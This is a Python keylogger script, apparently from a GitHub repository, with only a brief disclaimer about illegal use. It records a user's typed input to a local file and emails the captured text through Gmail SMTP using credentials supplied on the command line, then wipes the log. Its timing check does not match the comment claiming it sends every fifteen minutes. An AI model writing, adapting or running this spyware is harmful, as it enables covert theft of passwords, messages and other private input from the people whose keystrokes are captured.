#User is responsible for all uses of this program. Not intended to be used for
#illegal activities.
#https://github.com/ksmeeks0001/keylogger

import sys
import keyboard
import smtplib
import time
def get_log():
    """log/send/repeat"""
    now = time.time()
    file = open('log.txt', 'r+')
    while True: 
        log = keyboard.get_typed_strings(keyboard.record(until='enter'))
        file.write(next(log) + '\n')
        if len(sys.argv) > 1:
            if now >= (time.time() - 900): #send every 15 mins
                try:
                    file.seek(0) #back to start of file 
                    logged = file.read() #read in whole file
                    send(logged,sys.argv[1],sys.argv[2]) #send it out
                    file.seek(0) #back to start of file and erase
                    file.truncate()
                    now = time.time() #reset the time variable
                except: #if file was unable to be sent continue logging 
                    continue
    file.close()

def send(logged,account,password):
    """"Send the key logs to email"""
    obj = smtplib.SMTP ('smtp.gmail.com', 587)
    obj.ehlo()
    obj.starttls()
    obj.login(account, password)
    obj.sendmail(account, account,
                 "Subject: \n" + str(logged))
    obj.quit()

def main():
    file = open('log.txt', 'w') #clear/create log file
    file.close()
    get_log() #start logging
    
main()
    
    
    
